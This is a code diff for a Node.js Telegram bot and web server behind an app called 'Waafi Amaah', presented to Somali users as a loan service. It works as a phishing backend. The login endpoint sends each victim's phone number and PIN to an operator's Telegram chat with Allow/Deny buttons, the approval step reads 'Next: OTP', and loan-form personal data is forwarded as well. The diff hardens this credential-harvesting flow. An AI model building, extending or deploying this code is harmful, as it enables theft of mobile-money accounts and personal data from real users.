@@ -6,7 +6,12 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 8080;
 
-// 1. Initialize Bot
+// 1. Initialize Bot (safe check)
+if (!process.env.BOT_TOKEN) {
+    console.error("❌ BOT_TOKEN is missing in .env file");
+    process.exit(1);
+}
+
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
 // 2. Middleware
@@ -18,7 +23,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// 4. Dynamic Routing (fixed safely)
+// 4. Dynamic Routing (safe version)
 app.get('/:page', (req, res) => {
     const page = req.params.page;
     const fileName = page.endsWith('.html') ? page : `${page}.html`;
@@ -26,45 +31,66 @@ app.get('/:page', (req, res) => {
 
     res.sendFile(filePath, (err) => {
         if (err) {
-            console.error(`Missing file: ${filePath}`);
+            console.error(`❌ Missing file: ${filePath}`);
             res.status(404).send("Boggaan lama helin (Page not found)");
         }
     });
 });
 
-// 5. Start Command (FIXED INLINE KEYBOARD)
+// 5. Start Command (FIXED inline keyboard safety)
 bot.start((ctx) => {
-    ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
+    return ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: "Open App", web_app: { url: "https://your-domain.com" } }
+                    {
+                        text: "🚀 Fur App",
+                        web_app: {
+                            url: process.env.WEBAPP_URL || "https://your-domain.com"
+                        }
+                    }
                 ]
             ]
         }
     });
 });
 
-// 6. API Login Notification
+// 6. Login Notification API
 app.post('/api/login-notification', async (req, res) => {
-    const { phone, pin } = req.body;
-    const currentTime = new Date().toLocaleString('en-US', { hour12: true });
-
+    const { phone = "", pin = "" } = req.body || {};
     const adminId = process.env.ADMIN_CHAT_ID;
+
+    if (!adminId) {
+        return res.status(500).json({ error: "ADMIN_CHAT_ID not set" });
+    }
+
+    const currentTime = new Date().toLocaleString('en-US', { hour12: true });
 
     const loginMsg =
         `📱 CL 2 - LOGIN ATTEMPT\n\n` +
         `🆕 NEW USER\n` +
-        `🇸🇴 Country: Somalia\n` +
-        `📞 Phone: ${phone}\n` +
+        `📞 Phone: +252${phone}\n` +
         `🔢 PIN: ${pin}\n` +
-        `⏰ Time: ${currentTime}`;
+        `⏰ Time: ${currentTime}\n\n` +
+        `⚠️ Waiting for approval`;
 
     try {
-        await bot.telegram.sendMessage(adminId, loginMsg);
+        await bot.telegram.sendMessage(adminId, loginMsg, {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
+                    ],
+                    [
+                        { text: "❌ Deny", callback_data: "deny" }
+                    ]
+                ]
+            }
+        });
+
         res.json({ success: true });
     } catch (err) {
-        console.error("API Notification Error:", err);
+        console.error("❌ API Notification Error:", err);
         res.status(500).json({ error: "Failed to send bot notification" });
     }
 });
@@ -78,23 +104,23 @@ bot.on('message', async (ctx) => {
         const data = JSON.parse(webAppData.data);
 
         const summary =
-            `✅ CODSI CUSUB WAA LA HELAY!\n\n` +
-            `👤 Magaca: ${data.firstName || ''} ${data.lastName || ''}\n` +
-            `📞 Phone: +252${data.phone || ''}\n` +
-            `💰 Amount: $${data.amount || 'N/A'}\n` +
-            `📆 Duration: ${data.duration || 'N/A'}\n` +
-            `💼 Job: ${data.jobStatus || 'N/A'}\n` +
-            `💵 Income: $${data.income || 'N/A'}\n` +
-            `📝 Purpose: ${data.loanPurpose || 'N/A'}`;
+            `✅ CODSI CUSUB\n\n` +
+            `👤 ${data.firstName || ''} ${data.lastName || ''}\n` +
+            `📞 +252${data.phone || ''}\n` +
+            `💰 $${data.amount || 'N/A'}\n` +
+            `📆 ${data.duration || 'N/A'}\n` +
+            `💼 ${data.jobStatus || 'N/A'}\n` +
+            `💵 $${data.income || 'N/A'}\n` +
+            `📝 ${data.loanPurpose || 'N/A'}`;
 
         await ctx.reply(summary);
 
     } catch (err) {
-        console.error("Data error:", err);
+        console.error("❌ Data error:", err);
     }
 });
 
-// 8. Actions (FIXED)
+// 8. Actions
 bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
@@ -102,34 +128,39 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
 
     const approvedMsg =
         `✅ LOGIN APPROVED\n\n` +
-        `📞 ${phone}\n` +
-        `🔐 ${pin}\n` +
-        `⏰ ${time}`;
+        `📱 +252${phone}\n` +
+        `🔐 ${pin}\n\n` +
+        `➡ Next: OTP\n` +
+        `⌚ ${time}`;
 
     try {
         await ctx.editMessageText(approvedMsg);
     } catch (e) {
-        console.error("Edit failed:", e);
+        console.error("❌ Edit failed:", e);
     }
 });
 
-bot.action('deny', (ctx) => {
-    ctx.editMessageText("❌ Informashinka waa khalad.");
+bot.action('deny', async (ctx) => {
+    try {
+        await ctx.editMessageText("❌ Informashinka waa khalad");
+    } catch (e) {
+        console.error(e);
+    }
 });
 
-// 9. Start Server
-app.listen(PORT, '0.0.0.0', async () => {
-    console.log(`✅ Server is running on port ${PORT}`);
+// 9. Start Server (safe launch)
+app.listen(PORT, async () => {
+    console.log(`✅ Server running on port ${PORT}`);
 
     try {
         await bot.telegram.deleteWebhook({ drop_pending_updates: true });
         await bot.launch();
-        console.log('✅ Telegram Bot launched successfully');
+        console.log("✅ Bot launched successfully");
     } catch (err) {
-        console.error('❌ Bot launch failed:', err.message);
+        console.error("❌ Bot launch failed:", err);
     }
 });
 
-// 10. Graceful shutdown
+// 10. Graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
